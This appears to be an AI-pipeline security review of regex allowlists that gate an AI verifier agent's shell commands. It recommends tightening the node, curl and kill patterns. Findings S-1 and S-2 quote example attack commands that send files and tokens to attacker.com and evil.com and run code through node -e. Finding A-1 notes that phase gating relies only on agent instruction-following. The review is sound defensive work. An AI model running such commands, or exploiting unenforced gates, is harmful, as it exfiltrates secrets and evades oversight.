# Adversarial Review: code — security-sentinel

## Review Metadata

- **Perspective:** security-sentinel
- **Risk Level:** 🔴
- **Round:** 1
- **Run ID:** 2026-03-04T00:00:00Z
- **Schema Version:** 1.0

---

## Security Analysis

**Category Verdict:** needs_revision

### Finding S-1: `^node .+` Allowlist Pattern Permits Arbitrary Code Execution

- **Severity:** Critical
- **Description:** The `tier5_command_allowlist` pattern `^node .+` (pattern #4) matches ANY Node.js command with any arguments. This includes `node -e "require('child_process').execSync('...')"`, `node -e "process.env"` (environment exfiltration), and `node arbitrary-script.js`. The stated purpose is "Direct Node.js script execution" for app lifecycle, but the regex imposes no constraint on WHAT is executed. This effectively negates the security purpose of the allowlist for any Node.js-based attack vector. A semi-trusted E2E contract could define `start_command: { executable: "node", args: ["-e", "<malicious payload>"] }` and pass validation.
- **Affected artifacts:** [e2e-integration.md §5](NewAgents/.github/agents/e2e-integration.md#L360) pattern #4, [tool-access-matrix.md §8.2](NewAgents/.github/agents/tool-access-matrix.md#L79) pattern #4
- **Recommendation:** Replace `^node .+` with a restrictive pattern that only allows script file execution: `^node [\w./-]+\.(js|mjs|cjs)$` (alphanumeric path + JS extension, no `-e` flag). If inline execution is needed for specific lifecycle purposes, enumerate those patterns explicitly (e.g., `^node server\.js`, `^node dist/index\.js`).
- **Evidence:** Pattern `^node .+` at [e2e-integration.md L363](NewAgents/.github/agents/e2e-integration.md#L363) and [tool-access-matrix.md L79](NewAgents/.github/agents/tool-access-matrix.md#L79). Trust model at [e2e-integration.md §1 L34-37](NewAgents/.github/agents/e2e-integration.md#L34): command executables are "Semi-Trusted" (not fully trusted). `severity-taxonomy.md` L32: "Command allowlist bypass: run_in_terminal executed a command not in tier5_command_allowlist" listed as Blocker example — this pattern makes the allowlist's protection illusory for Node.js.

### Finding S-2: `^curl -s .+` Allowlist Pattern Permits Arbitrary HTTP Requests

- **Severity:** Critical
- **Description:** The `tier5_command_allowlist` pattern `^curl -s .+` (pattern #7) is documented as "Health check HTTP requests" but the regex allows any curl operation after the `-s` (silent) flag. This includes: `curl -s -X POST -d @/path/to/file http://attacker.com` (file exfiltration), `curl -s -H "Authorization: Bearer $TOKEN" http://evil.com` (credential forwarding), `curl -s --upload-file sensitive-data.db http://evil.com` (data upload). The pattern does not restrict HTTP method, headers, body, or target host.
- **Affected artifacts:** [e2e-integration.md §5](NewAgents/.github/agents/e2e-integration.md#L366) pattern #7, [tool-access-matrix.md §8.2](NewAgents/.github/agents/tool-access-matrix.md#L82) pattern #7
- **Recommendation:** Tighten to: `^curl -s (http://localhost|http://127\.0\.0\.1)[:/]` to restrict targets to localhost only (the app under test). If external health checks are needed, enumerate specific allowed hosts. Alternatively, restrict to GET-only: `^curl -s -o /dev/null -w '%{http_code}' http://localhost`.
- **Evidence:** Pattern at [e2e-integration.md L366](NewAgents/.github/agents/e2e-integration.md#L366). The intent per Purpose column is "Health check HTTP requests" but the regex permits POST, PUT, DELETE, file upload, arbitrary headers, and any target URL. Combined with the evidence sanitization pipeline (§6) which only redacts AFTER execution, the data is already exfiltrated before sanitization applies.

### Finding S-3: `^(kill|taskkill)` Pattern Allows Killing Any OS Process

- **Severity:** Major
- **Description:** The `^(kill|taskkill)` pattern (pattern #8) allows `kill -9 <any-PID>` or `taskkill /F /IM <any-process-name>`. There is no constraint on which PIDs or process names can be targeted. A malicious skill or contract interaction could kill critical OS processes, the IDE, or other pipeline agents. The teardown should only kill PIDs that were tracked during Phase 1 startup.
- **Affected artifacts:** [e2e-integration.md §5](NewAgents/.github/agents/e2e-integration.md#L367) pattern #8, [tool-access-matrix.md §8.2](NewAgents/.github/agents/tool-access-matrix.md#L83) pattern #8
- **Recommendation:** The verifier should only kill PIDs it has explicitly tracked (stored in `output_snippet` of `e2e-instance-start`). Change pattern to require PID reference: `^kill (-[0-9]+\s+)?[0-9]+$` (kill with optional signal flag + numeric PID only). For Windows, constrain to: `^taskkill /F /PID [0-9]+$`. Additionally, add a pre-execution check that the target PID matches a tracked PID from this run.
- **Evidence:** Pattern at [e2e-integration.md L367](NewAgents/.github/agents/e2e-integration.md#L367). PID tracking documented at [verifier.agent.md L282](NewAgents/.github/agents/verifier.agent.md#L282): "Record PID: INSERT with check_name='e2e-instance-start', store PID in output_snippet." But the kill pattern doesn't cross-reference tracked PIDs.

### Finding S-4: Incomplete PID Orphan Recovery on Agent Crash

- **Severity:** Major
- **Description:** `global-operating-rules.md` §10.1 states orphaned processes are "Blocker-severity." PID is stored in `anvil_checks.output_snippet` during Phase 1 (verifier.agent.md L282), which does survive agent crashes. However, there is no mechanism in the orchestrator's Pipeline State Recovery (global-operating-rules.md §7) or Step 0 to scan for orphaned PIDs from a previous interrupted run and kill them. If a verifier crashes between Phase 1 (app started) and Phase 5 (teardown), the app process and Playwright browser sessions remain running indefinitely.
- **Affected artifacts:** [global-operating-rules.md §10.1](NewAgents/.github/agents/global-operating-rules.md#L169), [global-operating-rules.md §7](NewAgents/.github/agents/global-operating-rules.md#L155), [orchestrator.agent.md Step 0](NewAgents/.github/agents/orchestrator.agent.md#L88)
- **Recommendation:** Add a Step 0 orphan cleanup sub-step: query `anvil_checks` for `check_name='e2e-instance-start' AND passed=1` from the previous `run_id` that lacks a corresponding `e2e-instance-shutdown` record. For each found PID, attempt `kill <PID>` and `playwright-cli kill-all`. Log cleanup results. This ensures previous interrupted runs don't leak processes.
- **Evidence:** Step 0 recovery procedure at [orchestrator.agent.md L88-L124](NewAgents/.github/agents/orchestrator.agent.md#L88) — scans for existing output files and resumes but does not check for orphaned processes. Verifier Phase 5 teardown at [verifier.agent.md L338-L349](NewAgents/.github/agents/verifier.agent.md#L338) only runs if the verifier reaches that phase.

### Finding S-5: Allowlist Pattern Order Inconsistency Between Canonical Copies

- **Severity:** Minor
- **Description:** The `tier5_command_allowlist` is defined in two places: `e2e-integration.md §5` (canonical copy per its own header) and `tool-access-matrix.md §8.2` (which references e2e-integration.md as canonical). The pattern numbering differs: e2e-integration.md has `playwright-cli` as #1 and `npx playwright test` as #2; tool-access-matrix.md reverses this order (#1=npx playwright, #2=playwright-cli). Since "first matching pattern wins" is the evaluation rule, different ordering could theoretically produce different audit trail entries for commands matching both patterns.
- **Affected artifacts:** [e2e-integration.md §5 L358-367](NewAgents/.github/agents/e2e-integration.md#L358), [tool-access-matrix.md §8.2 L75-83](NewAgents/.github/agents/tool-access-matrix.md#L75)
- **Recommendation:** Synchronize pattern numbering and order between both documents. Since e2e-integration.md is designated as canonical, tool-access-matrix.md should mirror its ordering exactly.
- **Evidence:** e2e-integration.md L358-L367 lists patterns 1-8; tool-access-matrix.md L75-L83 lists patterns 1-8 with swapped positions for patterns #1 and #2.

---

## Architecture Analysis

**Category Verdict:** approve

### Finding A-1: Verifier Trust Boundary Expansion — Instruction-Enforced Only

- **Severity:** Major
- **Description:** Tier 5 expands the verifier from a read-only verification cascade to a full process manager: starting applications, launching browsers, making HTTP requests, and killing processes. The phase gating enforcing "Tier 5 commands only during E2E phases" is instruction-enforced only (via agent prompt), not technically enforced. `tool-access-matrix.md §11` acknowledges this as an "accepted risk (residual threat level: Medium)." However, the verifier's `run_in_terminal` access is unconditionally expanded — there is no runtime mechanism to distinguish whether the verifier is in Tier 1-4 (restricted) vs Tier 5 (expanded). A misbehaving verifier could execute Tier 5 commands during Tier 1-4 without detection until adversarial review.
- **Affected artifacts:** [tool-access-matrix.md §8.1](NewAgents/.github/agents/tool-access-matrix.md#L63), [tool-access-matrix.md §11](NewAgents/.github/agents/tool-access-matrix.md#L131), [verifier.agent.md L265-L270](NewAgents/.github/agents/verifier.agent.md#L265)
- **Recommendation:** Since runtime enforcement is not feasible in the VS Code agent runtime (acknowledged), strengthen the audit trail: require the verifier to INSERT `check_name='tier5-phase-gate'` with `output_snippet='entering-tier5'` BEFORE any E2E commands, and `'exiting-tier5'` after. Adversarial reviewers can then verify no Tier 5 commands appear in the audit trail outside the phase gate markers.
- **Evidence:** tool-access-matrix.md §11 states: "Scope restrictions are enforced via agent instructions. VS Code's agent runtime does not support parameterized tool access policies. Compliance depends on LLM instruction-following." The verifier's Tier 5 section (verifier.agent.md L265) has a conditional gate comment but no enforceable mechanism.

No additional architecture findings. The design properly separates E2E coordination into a reference document (e2e-integration.md), maintains the per-agent reading guide for context efficiency, and preserves single-responsibility for the new E2E contract schema. Trust levels (Trusted/Semi-Trusted/Untrusted) are well-defined with appropriate validation at each level.

---

## Correctness Analysis

**Category Verdict:** approve

### Finding C-1: TASK-004 Implementer Self-Reported Line Count Discrepancy (e2e-integration.md)

- **Severity:** Major
- **Description:** The verifier caught two failures for TASK-004 (e2e-integration.md): (1) `baseline-discrepancy` passed=0: "implementer claimed 546 lines but actual file is 697 lines — 151 lines over self-reported count" and (2) `line-count-range` passed=0: "Actual: 697 lines. Target: 500 +/- 50 (450-550). Delta: +147 lines over upper bound." The 28% discrepancy between self-reported (546) and actual (697) line count raises an evidence accuracy concern. The file also exceeds the target range by 147 lines. The verifier correctly caught and recorded these failures but the task was still marked DONE (expected — implementer returns DONE with failures documented).
- **Affected artifacts:** TASK-004 verification evidence in `anvil_checks`, [e2e-integration.md](NewAgents/.github/agents/e2e-integration.md) (697 lines vs 450-550 target)
- **Recommendation:** The 28% discrepancy should be investigated — was this an honest estimation error or were sections added after the self-check? The excess 147 lines are mainly from §8 (timeout budgets, parallel isolation, API/CLI testing). Consider whether §8 content could be consolidated or whether the 550-line target should be revised upward given the document's scope. These failures did not block the pipeline (non-BLOCKING checks), but the discrepancy undermines confidence in implementer self-reporting.
- **Evidence:** `anvil_checks` records for TASK-004: `baseline-discrepancy` passed=0 with output "implementer claimed 546 lines but actual file is 697 lines"; `line-count-range` passed=0 with output "Actual: 697 lines. Target: 500 +/- 50 (450-550)."

No additional correctness findings. All 16 tasks correctly use `task_type=documentation` with `test_method=inspection` for all ACs — appropriate since all changes are agent instruction Markdown files. TDD fallbacks are properly recorded with valid justifications. Verification evidence covers all tiers appropriately. The 14 implementation files were reviewed for completeness; all required sections (TDD enforcement, E2E lifecycle, command allowlists, evidence sanitization) are present.

---

## Summary

From the security-sentinel perspective, the TDD & E2E enforcement implementation is architecturally sound and correctly structured, but contains **two Critical security gaps in the command allowlist** that partially defeat its purpose. The `^node .+` and `^curl -s .+` regex patterns are dangerously overbroad — the former permits arbitrary code execution, the latter permits arbitrary HTTP requests including data exfiltration. Combined with the unconstrained `kill`/`taskkill` pattern and incomplete PID orphan recovery, these undermine the E2E security posture described in the design. The rest of the implementation (evidence sanitization, structured command format, trust levels, session isolation, TDD compliance checks) is well-designed and correctly implemented. Recommend tightening the three overbroad allowlist patterns before proceeding.
